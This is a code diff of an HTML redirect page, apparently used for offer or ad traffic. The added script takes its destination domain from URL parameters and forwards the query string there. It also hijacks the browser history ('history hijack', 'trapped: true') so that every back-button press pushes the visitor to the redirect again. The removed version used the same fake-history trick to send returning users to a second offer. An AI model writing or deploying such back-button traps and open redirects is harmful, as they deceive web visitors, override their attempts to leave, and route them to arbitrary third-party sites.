@@ -22,51 +22,52 @@
   <h2>Wait while redirecting...</h2>
 
   <script>
-    /************** OFFERS **************/
-    const OFFER_A = "https://cutl.io";          // first offer
-    const OFFER_B = "https://www.offers.com/"; // back-button offer
+    /******** SETTINGS ********/
+    const CLICK_CODE = "wen25tvh";   // change if needed
+    const REDIRECT_DELAY = 800;      // ms
 
-    const REDIRECT_DELAY = 700;
-
-    /************** HELPERS **************/
+    /******** TRACKING ********/
     function track(event) {
       console.log("[TRACK]", event);
     }
 
-    /************** URL PARAM CHECK **************/
-    const url = new URL(window.location.href);
-    const z = url.searchParams.get("z");
+    /******** REDIRECT URL ********/
+    function buildRedirectUrl() {
+      const url = new URL(window.location.href);
+      const domain = url.searchParams.get("domain");
+      const z = url.searchParams.get("z");
 
-    if (!z) {
-      window.location.replace("https://google.com");
+      if (!domain || !z) {
+        return "https://www.facebook.com/";
+      }
+
+      return `https://${domain}/${CLICK_CODE}/${z}${url.search}`;
     }
 
-    /************** STATE **************/
-    const cameBack = sessionStorage.getItem("came_back");
+    const redirectUrl = buildRedirectUrl();
 
-    // inject fake history to detect back
-    history.pushState({ page: "trap" }, "", location.href);
+    /******** PAGE LOAD ********/
+    track("page_load");
 
-    /************** FIRST VISIT **************/
-    if (!cameBack) {
-      track("first_redirect");
+    // history hijack
+    history.pushState({ trapped: true }, "", location.href);
+
+    // initial redirect
+    setTimeout(() => {
+      track("redirect_page_load");
+      window.location.replace(redirectUrl);
+    }, REDIRECT_DELAY);
+
+    /******** BACK BUTTON ********/
+    window.addEventListener("popstate", function () {
+      track("back_button");
+
+      history.pushState({ trapped: true }, "", location.href);
 
       setTimeout(() => {
-        window.location.replace(OFFER_A);
-      }, REDIRECT_DELAY);
-    }
-
-    /************** BACK BUTTON LOGIC **************/
-    window.addEventListener("popstate", function () {
-      if (!sessionStorage.getItem("came_back")) {
-        track("back_redirect");
-
-        sessionStorage.setItem("came_back", "1");
-
-        setTimeout(() => {
-          window.location.replace(OFFER_B);
-        }, 300);
-      }
+        track("redirect_back");
+        window.location.replace(redirectUrl);
+      }, 300);
     });
   </script>
 </body>
